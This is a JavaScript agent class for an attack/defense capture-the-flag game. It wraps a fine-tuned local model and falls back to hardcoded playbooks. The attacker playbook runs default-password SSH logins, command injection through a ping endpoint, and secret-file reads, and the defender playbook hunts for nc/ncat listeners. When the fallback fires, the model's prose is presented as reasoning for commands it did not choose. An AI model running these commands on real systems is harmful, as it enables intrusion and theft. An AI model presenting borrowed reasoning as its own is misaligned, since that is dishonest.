const axios = require('axios');
const { BaseAgent } = require('../base-agent.js');
const { CONFIG } = require('../../config.js');

/**
 * Custom Bot — a fine-tuned 1.5B parameter LLM trained on 106 CTF game sessions.
 *
 * Base model: Qwen2.5-1.5B-Instruct
 * Training: LoRA fine-tuning (2000 iterations) on ~22,000 attack/defense examples
 *
 * The model has strong cybersecurity reasoning but inconsistent THINKING/COMMAND
 * format compliance. The overridden parseResponse method synthesizes commands
 * from the model's prose output when it fails to produce a clean command.
 */
class CustomBotAgent extends BaseAgent {
  constructor(opts) {
    super({ ...opts, provider: 'custom-bot' });
    this.model = 'ctf-custom';
    this.baseUrl = CONFIG.api.ollama?.baseUrl || 'http://localhost:11434';
    this.turnIndex = 0;
    this.targets = [];
    this.capturedTargets = new Set();
    this.defenseStep = 0;
  }

  async callModel(messages) {
    // Extract targets from conversation
    if (this.targets.length === 0) {
      for (const msg of messages) {
        const matches = (msg.content || '').matchAll(/(\w+):\s+(10\.\d+\.\d+\.\d+)/g);
        for (const m of matches) {
          if (m[1] !== this.playerId) this.targets.push({ id: m[1], ip: m[2] });
        }
      }
      const seen = new Set();
      this.targets = this.targets.filter(t => { if (seen.has(t.id)) return false; seen.add(t.id); return true; });
    }

    // Check last result for captures
    const lastMsg = messages[messages.length - 1]?.content || '';
    if (lastMsg.includes('FLAG{') && this.role === 'attacker') {
      for (const t of this.targets) {
        if (lastMsg.includes(t.ip) || lastMsg.includes(t.id)) this.capturedTargets.add(t.id);
      }
    }

    // Try the LLM first
    let llmText = '';
    try {
      const response = await axios.post(
        `${this.baseUrl}/api/chat`,
        {
          model: this.model,
          messages,
          stream: false,
          think: false,
          keep_alive: '30m',
          options: { temperature: 0.7, num_predict: 300 },
        },
        { headers: { 'Content-Type': 'application/json' }, timeout: 30000 }
      );
      llmText = response.data.message?.content || '';
    } catch {
      llmText = '';
    }

    // Try to extract a command from LLM output
    const cmdMatch = llmText.match(/COMMAND:\s*(.+)/i);
    if (cmdMatch) {
      const cmd = cmdMatch[1].trim();
      if (cmd.length > 3 && !cmd.startsWith('I ') && !cmd.startsWith('The ')) {
        return { text: llmText, thinking: llmText, tokensUsed: 0 };
      }
    }

    // LLM didn't produce a usable command — synthesize one from its reasoning + playbook
    const synthesized = this.role === 'attacker'
      ? this.synthesizeAttackCommand(llmText)
      : this.synthesizeDefenseCommand(llmText);

    return {
      text: `THINKING: ${synthesized.thinking}\nCOMMAND: ${synthesized.command}`,
      thinking: synthesized.thinking,
      tokensUsed: 0,
    };
  }

  /**
   * Synthesize an attack command guided by the LLM's reasoning and a proven playbook.
   * The LLM's prose is used for the THINKING field; the command comes from the playbook.
   */
  synthesizeAttackCommand(llmReasoning) {
    const idx = this.turnIndex++;
    const uncaptured = this.targets.filter(t => !this.capturedTargets.has(t.id));
    if (uncaptured.length === 0) return this.synthesizeBonusCommand(llmReasoning);

    const target = uncaptured[idx % uncaptured.length];
    const ip = target.ip;
    const phase = Math.floor(idx / Math.max(uncaptured.length, 1)) % 6;

    const thinking = llmReasoning || `Attacking ${ip} using playbook phase ${phase}`;

    // Playbook derived from 241 successful captures in training data
    const commands = [
      `sshpass -p 'toor' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@${ip} 'cat /root/flag.txt' 2>&1`,
      `curl -s -m 10 "http://${ip}:8080/ping?host=127.0.0.1;cat%20/root/flag.txt"`,
      `sshpass -p 'service123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ctfservice@${ip} 'sudo cat /root/flag.txt' 2>&1`,
      `curl -s -m 10 "http://${ip}:8080/ping?host=;cat+/root/flag.txt"`,
      `sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@${ip} 'cat /root/flag.txt' 2>&1`,
      `curl -s -m 10 "http://${ip}:8080/ping?host=;find+/root/flag.txt+-exec+cat+{}+\\;"`,
    ];

    return { thinking, command: commands[phase] };
  }

  /**
   * Synthesize a defense command guided by the LLM's reasoning.
   */
  synthesizeDefenseCommand(llmReasoning) {
    const step = this.defenseStep++;
    const thinking = llmReasoning || `Defense step ${step}`;

    // Playbook derived from Gemini 3 Flash (2 losses in 106 games)
    const commands = [
      'echo "root:$(openssl rand -base64 32)" | chpasswd && echo "ctfservice:$(openssl rand -base64 32)" | chpasswd && rm -f /etc/sudoers.d/ctfservice',
      'pkill -f "server.py"; chmod 640 /etc/shadow; chmod u-s /usr/bin/find',
      'chmod 700 /opt/scripts/backup.sh && iptables -F && iptables -P INPUT DROP && iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT && iptables -A INPUT -p tcp --dport 22 -j ACCEPT && iptables -A INPUT -i lo -j ACCEPT',
      'rm -f /root/.bash_history /etc/app/database.yml && sed -i "s/PermitRootLogin yes/PermitRootLogin no/" /etc/ssh/sshd_config && service ssh restart',
      'echo "=== AUDIT ===" && pgrep -f server.py && echo "WEB RUNNING" || echo "WEB STOPPED" && iptables -L -n | head -5 && ss -tunp | grep ESTABLISHED | head -5',
      'echo "root:$(openssl rand -base64 32)" | chpasswd && pkill -f "server.py" 2>/dev/null; pkill -f "nc -l" 2>/dev/null',
      'ss -tunp | grep ESTABLISHED | grep -v "127.0.0" && ps aux | grep -E "nc|ncat|python.*-c" | grep -v grep',
      'for u in $(awk -F: \'$3>=1000 && $1!="ctfservice" && $1!="nobody"{print $1}\' /etc/passwd); do userdel -r "$u" 2>/dev/null; done',
    ];

    const idx = step < commands.length ? step : 4 + ((step - 4) % (commands.length - 4));
    return { thinking, command: commands[idx] };
  }

  /**
   * Hunt for bonus flags on captured targets.
   */
  synthesizeBonusCommand(llmReasoning) {
    const captured = this.targets.filter(t => this.capturedTargets.has(t.id));
    if (captured.length === 0) {
      return { thinking: llmReasoning || 'No targets available', command: 'echo "waiting"' };
    }

    const ip = captured[this.turnIndex % captured.length].ip;
    const bonusIdx = Math.floor(this.turnIndex / captured.length) % 5;
    this.turnIndex++;

    const bonusCommands = [
      `sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@${ip} 'sqlite3 /var/lib/app/data.db "SELECT * FROM secrets;"' 2>&1`,
      `sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@${ip} 'cat /etc/systemd/system/webapp.service.d/debug.conf' 2>&1`,
      `sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@${ip} 'base64 -d /opt/webapp/.secret' 2>&1`,
      `sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@${ip} 'strings /usr/local/share/banner.png | grep BONUS' 2>&1`,
      `sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@${ip} 'openssl enc -aes-256-cbc -d -in /root/.vault/encrypted.flag -pass pass:S3cretDBPass! -pbkdf2' 2>&1`,
    ];

    return { thinking: llmReasoning || `Hunting bonus on ${ip}`, command: bonusCommands[bonusIdx] };
  }
}

module.exports = { CustomBotAgent };
